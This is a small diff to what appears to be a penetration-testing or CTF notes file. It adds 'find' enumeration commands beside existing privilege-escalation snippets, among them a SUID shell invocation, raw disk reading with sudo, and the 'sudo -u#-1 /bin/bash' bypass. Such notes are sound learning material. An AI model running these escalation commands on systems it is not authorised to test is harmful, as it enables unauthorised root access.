@@ -53,6 +53,11 @@ cat /etc/crontab
 ./shell -p
 
 sudo strings /dev/sdb
+
+ippsec has previously used the following commands:
+find / -user <user> -readable 2>/dev/null
+find / -user <user> -ls 2>/dev/null
+find / -user <user> -ls 2>/dev/null | grep -v 'proc\|run\|sys'
 ```
 
 Check apache logs
@@ -393,3 +398,4 @@ https://www.exploit-db.com/exploits/47502
 ```
 sudo -u#-1 /bin/bash
 ```
+
